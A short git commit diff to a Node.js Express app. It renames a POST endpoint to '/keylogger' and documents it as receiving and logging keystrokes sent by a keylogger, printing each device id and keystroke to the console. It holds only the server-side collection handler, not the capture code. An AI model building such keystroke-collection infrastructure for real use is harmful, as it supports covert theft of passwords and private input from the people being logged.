6712a243a1b350455523bea5cdb27ee2d64aadd0
Lukáš Kovařík <xkovari4@fi.muni.cz>
2023-03-31 20:15:02 +0200

    feat: POST endpoint for logging keystrokes from keylogger

--- src/index.js
+++ src/index.js
@@ -7,8 +7,13 @@ app.get('/', (req, res) => {
   res.send('Hello World!')
 })
 
-app.post("/log", (req, res)=>{
-    console.log(req.body)
+/**
+ * POST endpoint for receiving and logging keystrokes from keylogger.
+ * 
+ * Accepts JSON body of POST request in format: `{id, keystroke}`
+ */
+app.post("/keylogger", (req, res)=>{
+    console.log(`${req.body.id}: ${req.body.keystroke}`)
     res.status(200).send({ok:true})
 
 })
